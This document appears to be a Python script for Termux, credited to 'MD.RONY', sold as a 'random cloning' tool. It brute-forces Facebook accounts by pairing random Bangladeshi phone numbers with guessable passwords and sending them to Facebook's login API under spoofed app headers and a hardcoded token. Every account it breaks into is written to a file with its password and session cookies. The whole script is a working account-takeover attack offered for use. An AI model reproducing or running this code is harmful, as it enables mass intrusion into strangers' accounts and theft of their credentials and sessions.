#-------------------- import box--------------------------#
import os
from os import system as clr
import random
import string 
from concurrent.futures import ThreadPoolExecutor as tred
import requests
import re
import sys
import uuid
import json
os.system("pkg install espeak")
#-----------------------color box---------------------------#
bblack="\033[1;30m"         # Black
M="\033[1;31m"            # Red
H="\033[1;32m"         # Green
byellow="\033[1;33m"        # Yellow
bblue="\033[1;34m"          # Blue
P="\033[1;35m"        # Purple
C="\033[1;36m"          # Cyan
B="\033[1;37m"         # White
my_color = [
 B,C,P,H]
warna = random.choice(my_color)
oks=[]
cps=[]
loop=0
#----------------------+--logo--------------+--------------#
logo=(f'''
{B}8888888b.   .d88888b.  888b    888 Y88b   d88P 
{warna}888   Y88b d88P" "Y88b 8888b   888  Y88b d88P  
{B}888    888 888     888 88888b  888   Y88o88P   
{warna}888   d88P 888     888 888Y88b 888    Y888P    
{B}8888888P"  888     888 888 Y88b888     888     
{warna}888 T88b   888     888 888  Y88888     888     
{B}888  T88b  Y88b. .d88P 888   Y8888     888     
{warna}888   T88b  "Y88888P"  888    Y888     888     RUBA
{warna}--------------------------------------------{B}
 [•] Author    : {C}MD.RONY{B}
 [•] Guthub    : {C}MD.RONY{B}
 [•] Facebook  : {C}RONY RUBA{B}
 [•] Version   : {M}0.1{warna}
 [•] Tools     : {H}FREE{warna}
{warna}--------------------------------------------{B}''')
#------------_-----------linex box ---------------------------#
def linex():
    print(f'{warna}--------------------------------------------{B}')
#------------------------clear box----------------------------#
def clear():
    clr('clear')
    print(logo)
#------------------------main box----------------------------#
def MR_DIPTO():
    clear()
    os.system('xdg-open https://www.facebook.com/s.j.s.h.a.h.i.n.4.5')
    print(f' [{H}01{warna}] RANDOM CLONING ')
    print(f' [{H}00{warna}] EXIT ')
    linex()
    option=input(f' {B}[{warna}??{B}] CHOICE MENU >> ')
    if option in ['01','1']:
        BD_CLONING()
    else:
        exit(' Thanks for using dear :)')
#-------------------- bd clone box------------------------#
def BD_CLONING():
    user=[]
    clear()
    print(' EXAMPLE SIM CODE : [016] [017] [018] [019]')
    code=input(' ENTER SIM CODE >> ')
    linex()
    print(' EXAMPLE LIMIT : [1000] [2000] [5000] [10000]')
    try:
        limit=int(input(' ENTER LIMIT >> '))
    except ValueError:
        limit=50000
    clear()
    for nmbr in range(limit):
        nmp=''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    with tred(max_workers=30) as Dipto:
        tl=str(len(user))
        print(' [=] TOTAL ACCOUNT : '+tl)
        print(' [=] YOUR SIM CODE : '+code)
        print(' [=] WAIT FOR OK ID')
        print(' [=] USE AIRPLANE MODE 5 MIN')
        print(' [=] PROGRESS HAS BEEN RUNNING PLEASE WAIT ')
        linex()
        for psx in user:
            ids=code+psx
            passlist=[psx,ids,ids[:7],ids[:6],ids[5:],ids[4:],'sadiya','jannat']
            Dipto.submit(method_crack,ids,passlist)
    linex()
    print(' [✓] THE PROGRESS HAS BEEN COMPLETE ')
    print(' [✓] TOTAL OK ID '+str(len(oks)))
    print(' [×] TOTAL CP ID '+str(len(cps)))
    input(' [?] PRESS ENTER TO BACK  : ')
    MR_DIPTO()
#------------ method crack def ---------#
def method_crack(ids,passlist):
    global oks
    global cps
    global loop
    try:
        for pas in passlist:
            sys.stdout.write('\r\r \033[1;36m[LOADING] %s|\033[1;32m[OK]:%s'%(loop,len(oks)))
            sys.stdout.flush()
            adid=str(uuid.uuid4())
            device_id=str(uuid.uuid4())
            datax={'adid': adid, 'format': 'json', 'device_id': device_id, 'email': ids, 'password': pas, 'generate_analytics_claims': '1', 'credentials_type': 'password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false', 'generate_session_cookies': '1', 'generate_machine_id': '1', 'meta_inf_fbmeta': '', 'currently_logged_in_userid': '0', 'fb_api_req_friendly_name': 'authenticate'}
            header= {'User-Agent': '[FBAN/FB4A;FBAV/368.0.0.24.108;FBBV/371897983;FBDM/{density=1.0,width=600,height=976};FBLC/en_US;FBCR/null;FBMF/JTYjay;FBBD/D101;FBPN/com.facebook.katana;FBDV/D101;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive', 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Friendly-Name': 'authenticate', 'X-FB-Connection-Bandwidth': '21435', 'X-FB-Net-HNI': '35793', 'X-FB-SIM-HNI': '37855', 'X-FB-Connection-Type': 'unknown', 'Content-Type': 'application/x-www-form-urlencoded', 'X-FB-HTTP-Engine': 'Liger'}
            url='https://api.facebook.com/method/auth.login'
            reqx=requests.post(url,data=datax,headers=header).json()
            if 'session_key' in reqx:
                try:
                    uid=reqx['uid']
                except:
                    uid=ids
                if str(uid) in oks:
                    break
                else:
                    print('\r\r \033[1;32m[RONY-OK] '+str(uid)+' | '+pas+'\033[1;37m')
                    os.system('espeak -a 300 "RONY,  Ok,  id"')
                    coki=";".join(i["name"]+"="+i["value"] for i in reqx["session_cookies"])
                    print('\033[1;34m [COOKIES] '+coki)
                    open('/sdcard/RONY-OK.txt','a').write(str(uid)+' | '+pas+'\n')
                    oks.append(str(uid))
                    break
            elif 'www.facebook.com' in reqx['error_msg']:
                print('\r\r \033[1;31m[RUBA-CP] '+ids+' | '+pas+'\033[1;37m')
                os.system('espeak -a 300 " Cp,"')
                open('/sdcard/RUBA-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:
                continue
        loop+=1
    except:
        pass
#-------------------end-----------------------#
MR_DIPTO()